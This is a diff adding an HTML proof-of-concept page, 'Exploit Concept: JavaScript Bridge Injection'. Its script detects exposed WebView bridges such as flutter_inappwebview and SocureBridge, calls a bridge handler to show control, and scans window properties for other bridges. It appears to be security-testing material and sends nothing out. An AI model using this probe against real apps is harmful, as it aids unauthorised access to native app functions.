@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Probe</title>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        .found { color: #ff00ff; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>Exploit Concept: JavaScript Bridge Injection</h1>
+    <div id="log">Initializing probe...</div>
+
+    <script>
+        function log(msg, highlight) {
+            const div = document.createElement('div');
+            div.innerHTML = msg;
+            if (highlight) div.className = 'found';
+            document.getElementById('log').appendChild(div);
+        }
+
+        // 1. Check for the Flutter InAppWebView Bridge
+        if (window.flutter_inappwebview) {
+            log("[!] SUCCESS: flutter_inappwebview detected!", true);
+            // Attempt to call a handler to prove control
+            window.flutter_inappwebview.callHandler('handlerName', 'test_data');
+        }
+
+        // 2. Check for Socure Bridge
+        if (window.SocureBridge) {
+            log("[!] SUCCESS: SocureBridge detected!", true);
+        }
+
+        // 3. Scan all window properties for hidden bridges
+        log("Scanning window properties...");
+        for (var prop in window) {
+            if (prop.toLowerCase().includes('bridge') || prop.toLowerCase().includes('interface')) {
+                log("Potential Bridge Found: " + prop, true);
+            }
+        }
+    </script>
+</body>
+</html>
